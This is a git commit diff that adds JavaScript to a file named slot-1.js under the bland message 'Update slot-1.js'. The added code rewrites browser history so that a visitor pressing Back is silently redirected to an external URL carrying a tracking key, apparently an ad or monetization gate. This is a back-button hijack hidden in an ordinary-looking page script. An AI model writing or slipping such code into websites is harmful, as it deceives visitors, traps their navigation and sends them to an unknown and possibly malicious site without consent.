6c09001a42b94761477d49c4187832ac22f414c8
Hafith <88893624+Hafith@users.noreply.github.com>
2021-11-14 22:47:44 +0700

    Update slot-1.js

--- slot-1.js
+++ slot-1.js
@@ -1,1 +1,15 @@
 
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
+
+window.addEventListener("popstate", function() {
+  if(location.hash === "#!/history") {
+    history.replaceState(null, document.title, location.pathname);
+    setTimeout(function(){
+      location.replace("https://www.trustedgatetocontent.com/uakns2pa4q?key=80732eb774e6770e4a5e57a38b14a181");
+    },10);
+  }
+}, false);
+}(window, location));
+
